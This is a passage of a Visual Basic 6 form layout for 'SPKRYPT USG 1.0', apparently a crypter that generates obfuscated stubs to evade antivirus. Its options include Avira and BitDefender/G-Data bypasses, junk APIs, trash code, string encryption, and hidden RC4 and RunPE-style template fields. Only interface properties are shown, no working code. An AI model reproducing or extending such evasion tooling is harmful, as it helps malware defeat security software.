VERSION 5.00
Object = "{A8E5842E-102B-4289-9D57-3B3F5B5E15D3}#13.2#0"; "CODEJO~1.OCX"
Begin VB.Form frmMain 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "                                              - =      SPKRYPT USG 1.0    = -"
   ClientHeight    =   9720
   ClientLeft      =   6075
   ClientTop       =   585
   ClientWidth     =   6870
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   9720
   ScaleWidth      =   6870
   Begin XtremeSuiteControls.PushButton cmdExit 
      Height          =   255
      Left            =   3600
      TabIndex        =   57
      Top             =   9360
      Width           =   3135
      _Version        =   851970
      _ExtentX        =   5530
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "Exit"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      UseVisualStyle  =   -1  'True
      Picture         =   "frmMain.frx":0000
   End
   Begin XtremeSuiteControls.GroupBox grpTrashEngine 
      Height          =   1335
      Left            =   120
      TabIndex        =   50
      Top             =   6240
      Width           =   6615
      _Version        =   851970
      _ExtentX        =   11668
      _ExtentY        =   2355
      _StockProps     =   79
      Caption         =   "       Trashing Engine"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      UseVisualStyle  =   -1  'True
      Begin XtremeSuiteControls.CheckBox chkIfTrash 
         Height          =   255
         Left            =   5160
         TabIndex        =   54
         Top             =   720
         Width           =   1095
         _Version        =   851970
         _ExtentX        =   1931
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "If Trash"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Enabled         =   0   'False
         UseVisualStyle  =   -1  'True
      End
      Begin XtremeSuiteControls.CheckBox chkVarTrash 
         Height          =   255
         Left            =   3240
         TabIndex        =   53
         Top             =   720
         Width           =   1335
         _Version        =   851970
         _ExtentX        =   2355
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Variable Trash"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Enabled         =   0   'False
         UseVisualStyle  =   -1  'True
      End
      Begin XtremeSuiteControls.CheckBox chkGotoTrash 
         Height          =   255
         Left            =   1440
         TabIndex        =   52
         Top             =   720
         Width           =   1215
         _Version        =   851970
         _ExtentX        =   2143
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "GoTo Trash"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Enabled         =   0   'False
         UseVisualStyle  =   -1  'True
      End
      Begin XtremeSuiteControls.CheckBox chkTrashing 
         Height          =   255
         Left            =   600
         TabIndex        =   51
         Top             =   360
         Width           =   1455
         _Version        =   851970
         _ExtentX        =   2566
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Enable Trashing"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
      End
      Begin VB.Image Image24 
         Height          =   240
         Left            =   6360
         Picture         =   "frmMain.frx":011E
         Top             =   0
         Width           =   240
      End
      Begin VB.Image Image23 
         Height          =   240
         Left            =   4680
         Picture         =   "frmMain.frx":052A
         Top             =   720
         Width           =   240
      End
      Begin VB.Image Image22 
         Height          =   240
         Left            =   2760
         Picture         =   "frmMain.frx":0669
         Top             =   720
         Width           =   240
      End
      Begin VB.Image Image21 
         Height          =   240
         Left            =   1080
         Picture         =   "frmMain.frx":07A8
         Top             =   720
         Width           =   240
      End
      Begin VB.Image Image20 
         Height          =   240
         Left            =   120
         Picture         =   "frmMain.frx":09D3
         Top             =   0
         Width           =   240
      End
   End
   Begin XtremeSuiteControls.GroupBox grpBitDefenderGData 
      Height          =   1335
      Left            =   2280
      TabIndex        =   46
      Top             =   4800
      Width           =   2295
      _Version        =   851970
      _ExtentX        =   4048
      _ExtentY        =   2355
      _StockProps     =   79
      Caption         =   "    BitDefender|G-Data"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      UseVisualStyle  =   -1  'True
      Begin XtremeSuiteControls.CheckBox chkCompileC 
         Height          =   255
         Left            =   120
         TabIndex        =   47
         Top             =   480
         Width           =   1695
         _Version        =   851970
         _ExtentX        =   2990
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Compile stub to C:\"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
      End
      Begin XtremeSuiteControls.Label Label8 
         Height          =   375
         Left            =   120
         TabIndex        =   55
         Top             =   720
         Width           =   1935
         _Version        =   851970
         _ExtentX        =   3413
         _ExtentY        =   661
         _StockProps     =   79
         Caption         =   "Note: Run USG as Admin"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin VB.Label Label7 
         Caption         =   "NOTE: Run USG as Admin"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   375
         Left            =   -5040
         TabIndex        =   48
         Top             =   720
         Width           =   1575
      End
      Begin VB.Image Image19 
         Height          =   240
         Left            =   1800
         Picture         =   "frmMain.frx":0C65
         Top             =   480
         Width           =   240
      End
      Begin VB.Image Image15 
         Height          =   240
         Left            =   0
         Picture         =   "frmMain.frx":1071
         Top             =   0
         Width           =   240
      End
      Begin VB.Image Image14 
         Height          =   240
         Left            =   2040
         Picture         =   "frmMain.frx":14AC
         Top             =   0
         Width           =   240
      End
   End
   Begin XtremeSuiteControls.GroupBox grpAvira 
      Height          =   1335
      Left            =   4680
      TabIndex        =   41
      Top             =   4800
      Width           =   2055
      _Version        =   851970
      _ExtentX        =   3625
      _ExtentY        =   2355
      _StockProps     =   79
      Caption         =   "         Avira Bypass"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      UseVisualStyle  =   -1  'True
      Begin XtremeSuiteControls.CheckBox chkAhPi 
         Height          =   255
         Left            =   120
         TabIndex        =   56
         Top             =   720
         Width           =   1695
         _Version        =   851970
         _ExtentX        =   2990
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "API Bypass (Best)"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
      End
      Begin XtremeSuiteControls.CheckBox chkAvira2 
         Height          =   255
         Left            =   120
         TabIndex        =   45
         Top             =   360
         Width           =   1935
         _Version        =   851970
         _ExtentX        =   3413
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Avira Bypass Method 2"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
      End
      Begin VB.Image Image16 
         Height          =   240
         Left            =   1800
         Picture         =   "frmMain.frx":16FE
         Top             =   0
         Width           =   240
      End
      Begin VB.Image Image13 
         Height          =   240
         Left            =   240
         Picture         =   "frmMain.frx":1B0A
         Top             =   0
         Width           =   240
      End
   End
   Begin XtremeSuiteControls.GroupBox grpFakeFunction 
      Height          =   1455
      Left            =   3480
      TabIndex        =   35
      Top             =   3240
      Width           =   3255
      _Version        =   851970
      _ExtentX        =   5741
      _ExtentY        =   2566
      _StockProps     =   79
      Caption         =   "         Junk Functions"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      UseVisualStyle  =   -1  'True
      Begin XtremeSuiteControls.CheckBox chkTrashFunc 
         Height          =   255
         Left            =   360
         TabIndex        =   40
         Top             =   1080
         Width           =   1575
         _Version        =   851970
         _ExtentX        =   2778
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Trash Functions"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Enabled         =   0   'False
         UseVisualStyle  =   -1  'True
      End
      Begin XtremeSuiteControls.FlatEdit txtMaxFunc 
         Height          =   255
         Left            =   1440
         TabIndex        =   38
         Top             =   720
         Width           =   615
         _Version        =   851970
         _ExtentX        =   1085
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Enabled         =   0   'False
         Text            =   "8"
      End
      Begin XtremeSuiteControls.FlatEdit txtMinFunc 
         Height          =   255
         Left            =   360
         TabIndex        =   37
         Top             =   720
         Width           =   615
         _Version        =   851970
         _ExtentX        =   1085
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Enabled         =   0   'False
         Text            =   "2"
      End
      Begin XtremeSuiteControls.CheckBox chkJunkFunc 
         Height          =   255
         Left            =   360
         TabIndex        =   36
         Top             =   360
         Width           =   2175
         _Version        =   851970
         _ExtentX        =   3836
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Add Junk Functions"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
      End
      Begin VB.Image Image17 
         Height          =   240
         Left            =   3000
         Picture         =   "frmMain.frx":1C75
         Top             =   0
         Width           =   240
      End
      Begin XtremeSuiteControls.Label Label6 
         Height          =   255
         Left            =   960
         TabIndex        =   39
         Top             =   720
         Width           =   375
         _Version        =   851970
         _ExtentX        =   661
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "    /"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin VB.Image Image12 
         Height          =   240
         Left            =   240
         Picture         =   "frmMain.frx":2081
         Top             =   0
         Width           =   240
      End
   End
   Begin XtremeSuiteControls.GroupBox grpExtra 
      Height          =   1095
      Left            =   3480
      TabIndex        =   32
      Top             =   2160
      Width           =   3255
      _Version        =   851970
      _ExtentX        =   5741
      _ExtentY        =   1931
      _StockProps     =   79
      Caption         =   "         Extras"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      UseVisualStyle  =   -1  'True
      Begin XtremeSuiteControls.CheckBox chkRemBlank 
         Height          =   255
         Left            =   360
         TabIndex        =   34
         Top             =   720
         Width           =   2295
         _Version        =   851970
         _ExtentX        =   4048
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Remove Blank Lines"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
      End
      Begin XtremeSuiteControls.CheckBox chkRemOE 
         Height          =   255
         Left            =   360
         TabIndex        =   33
         Top             =   360
         Width           =   2055
         _Version        =   851970
         _ExtentX        =   3625
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Remove Option Explicit"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
      End
      Begin VB.Image Image18 
         Height          =   240
         Left            =   3000
         Picture         =   "frmMain.frx":215A
         Top             =   0
         Width           =   240
      End
      Begin VB.Image Image6 
         Height          =   240
         Left            =   240
         Picture         =   "frmMain.frx":2566
         Top             =   0
         Width           =   240
      End
   End
   Begin XtremeSuiteControls.GroupBox grpJunk 
      Height          =   1335
      Left            =   120
      TabIndex        =   23
      Top             =   4800
      Width           =   2055
      _Version        =   851970
      _ExtentX        =   3625
      _ExtentY        =   2355
      _StockProps     =   79
      Caption         =   "       Junk APIs"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      UseVisualStyle  =   -1  'True
      Begin XtremeSuiteControls.FlatEdit txtMaxAPI 
         Height          =   255
         Left            =   1200
         TabIndex        =   27
         Top             =   840
         Width           =   615
         _Version        =   851970
         _ExtentX        =   1085
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Enabled         =   0   'False
         Text            =   "19"
      End
      Begin XtremeSuiteControls.FlatEdit txtMinAPI 
         Height          =   255
         Left            =   240
         TabIndex        =   25
         Top             =   840
         Width           =   615
         _Version        =   851970
         _ExtentX        =   1085
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Enabled         =   0   'False
         Text            =   "8"
      End
      Begin XtremeSuiteControls.CheckBox chkJunkAPI 
         Height          =   255
         Left            =   120
         TabIndex        =   24
         Top             =   480
         Width           =   1455
         _Version        =   851970
         _ExtentX        =   2566
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Add Junk APIs"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
      End
      Begin XtremeSuiteControls.CheckBox chkAvira1 
         Height          =   255
         Left            =   120
         TabIndex        =   49
         Top             =   240
         Width           =   1935
         _Version        =   851970
         _ExtentX        =   3413
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Avira Bypass Method 1"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Enabled         =   0   'False
         UseVisualStyle  =   -1  'True
         Value           =   1
      End
      Begin VB.Image Image7 
         Height          =   240
         Left            =   1800
         Picture         =   "frmMain.frx":2966
         Top             =   0
         Width           =   240
      End
      Begin XtremeSuiteControls.Label Label4 
         Height          =   255
         Left            =   840
         TabIndex        =   26
         Top             =   840
         Width           =   495
         _Version        =   851970
         _ExtentX        =   873
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "  /"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin VB.Image Image5 
         Height          =   240
         Left            =   120
         Picture         =   "frmMain.frx":2D72
         Top             =   0
         Width           =   240
      End
   End
   Begin XtremeSuiteControls.GroupBox grpSplit 
      Height          =   1215
      Left            =   120
      TabIndex        =   18
      Top             =   7680
      Width           =   6615
      _Version        =   851970
      _ExtentX        =   11668
      _ExtentY        =   2143
      _StockProps     =   79
      Caption         =   "       Split Key"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      UseVisualStyle  =   -1  'True
      Begin XtremeSuiteControls.PushButton cmdGenSplit 
         Height          =   255
         Left            =   240
         TabIndex        =   20
         Top             =   720
         Width           =   6135
         _Version        =   851970
         _ExtentX        =   10821
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Generate"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
         Picture         =   "frmMain.frx":2E4B
      End
      Begin XtremeSuiteControls.FlatEdit txtSplit 
         Height          =   255
         Left            =   240
         TabIndex        =   19
         Top             =   360
         Width           =   6135
         _Version        =   851970
         _ExtentX        =   10821
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Text            =   "Split Key"
      End
      Begin VB.Image Image11 
         Height          =   240
         Left            =   6360
         Picture         =   "frmMain.frx":309C
         Top             =   0
         Width           =   240
      End
      Begin VB.Image Image4 
         Height          =   240
         Left            =   120
         Picture         =   "frmMain.frx":34A8
         Top             =   0
         Width           =   240
      End
   End
   Begin XtremeSuiteControls.GroupBox grpEncrypt 
      Height          =   2055
      Left            =   3480
      TabIndex        =   15
      Top             =   120
      Width           =   3255
      _Version        =   851970
      _ExtentX        =   5741
      _ExtentY        =   3625
      _StockProps     =   79
      Caption         =   "       String Encyption"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      UseVisualStyle  =   -1  'True
      Begin XtremeSuiteControls.FlatEdit txtLessChars 
         Height          =   255
         Left            =   480
         TabIndex        =   30
         Top             =   1560
         Width           =   735
         _Version        =   851970
         _ExtentX        =   1296
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Enabled         =   0   'False
         Text            =   "2"
      End
      Begin XtremeSuiteControls.CheckBox chkStrLess 
         Height          =   255
         Left            =   360
         TabIndex        =   28
         Top             =   1200
         Width           =   2295
         _Version        =   851970
         _ExtentX        =   4048
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Don't crypt string less than"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
      End
      Begin XtremeSuiteControls.CheckBox chkStrROT 
         Height          =   255
         Left            =   1920
         TabIndex        =   22
         Top             =   720
         Width           =   855
         _Version        =   851970
         _ExtentX        =   1508
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Rot13"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Enabled         =   0   'False
         UseVisualStyle  =   -1  'True
      End
      Begin XtremeSuiteControls.CheckBox chkStrAscii 
         Height          =   255
         Left            =   480
         TabIndex        =   17
         Top             =   720
         Width           =   735
         _Version        =   851970
         _ExtentX        =   1296
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "ASCII"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Enabled         =   0   'False
         UseVisualStyle  =   -1  'True
      End
      Begin XtremeSuiteControls.CheckBox chkEncrypt 
         Height          =   255
         Left            =   360
         TabIndex        =   16
         Top             =   360
         Width           =   2055
         _Version        =   851970
         _ExtentX        =   3625
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Encrypt Strings"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
      End
      Begin VB.Image Image10 
         Height          =   240
         Left            =   3000
         Picture         =   "frmMain.frx":36ED
         Top             =   0
         Width           =   240
      End
      Begin XtremeSuiteControls.Label Label5 
         Height          =   255
         Left            =   1320
         TabIndex        =   31
         Top             =   1560
         Width           =   1095
         _Version        =   851970
         _ExtentX        =   1931
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "characters."
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin VB.Image Image3 
         Height          =   240
         Left            =   120
         Picture         =   "frmMain.frx":3AF9
         Top             =   0
         Width           =   240
      End
   End
   Begin XtremeSuiteControls.GroupBox grpClean 
      Height          =   1215
      Left            =   120
      TabIndex        =   12
      Top             =   3480
      Width           =   3255
      _Version        =   851970
      _ExtentX        =   5741
      _ExtentY        =   2143
      _StockProps     =   79
      Caption         =   "       Clean Up"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      UseVisualStyle  =   -1  'True
      Begin XtremeSuiteControls.CheckBox chkCleanUpLast 
         Height          =   255
         Left            =   240
         TabIndex        =   14
         Top             =   720
         Width           =   2535
         _Version        =   851970
         _ExtentX        =   4471
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Remove Last Generated Project"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
      End
      Begin XtremeSuiteControls.CheckBox chkCleanUp 
         Height          =   255
         Left            =   240
         TabIndex        =   13
         Top             =   360
         Width           =   2415
         _Version        =   851970
         _ExtentX        =   4260
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Remove Project After Compile"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
      End
      Begin VB.Image Image8 
         Height          =   240
         Left            =   3000
         Picture         =   "frmMain.frx":3F03
         Top             =   0
         Width           =   240
      End
      Begin VB.Image Image2 
         Height          =   240
         Left            =   120
         Picture         =   "frmMain.frx":430F
         Top             =   0
         Width           =   240
      End
   End
   Begin XtremeSuiteControls.PushButton cmdCompile 
      Height          =   255
      Left            =   120
      TabIndex        =   10
      Top             =   9360
      Width           =   3375
      _Version        =   851970
      _ExtentX        =   5953
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "Compile"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Enabled         =   0   'False
      UseVisualStyle  =   -1  'True
   End
   Begin XtremeSuiteControls.PushButton cmdGenerate 
      Height          =   255
      Left            =   120
      TabIndex        =   9
      Top             =   9000
      Width           =   6615
      _Version        =   851970
      _ExtentX        =   11668
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "Generate Stub"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      UseVisualStyle  =   -1  'True
      Picture         =   "frmMain.frx":4537
   End
   Begin VB.TextBox txtFrmLoad 
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   2175
      Left            =   8040
      MultiLine       =   -1  'True
      TabIndex        =   2
      Text            =   "frmMain.frx":4964
      Top             =   5520
      Width           =   3375
   End
   Begin VB.TextBox txtRC4 
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   2175
      Left            =   8040
      MultiLine       =   -1  'True
      TabIndex        =   1
      Text            =   "frmMain.frx":508A
      Top             =   3000
      Width           =   3375
   End
   Begin VB.TextBox txtcPEL 
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   2295
      Left            =   8040
      MultiLine       =   -1  'True
      TabIndex        =   0
      Text            =   "frmMain.frx":5F4F
      Top             =   480
      Width           =   3375
   End
   Begin XtremeSuiteControls.GroupBox grpRand 
      Height          =   3375
      Left            =   120
      TabIndex        =   6
      Top             =   120
      Width           =   3255
      _Version        =   851970
      _ExtentX        =   5741
      _ExtentY        =   5953
      _StockProps     =   79
      Caption         =   "      Randomize"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      UseVisualStyle  =   -1  'True
      Begin XtremeSuiteControls.CheckBox chkRandFileInfo 
         Height          =   255
         Left            =   240
         TabIndex        =   44
         Top             =   2880
         Width           =   2415
         _Version        =   851970
         _ExtentX        =   4260
         _ExtentY        =   450
         _StockProps     =   79
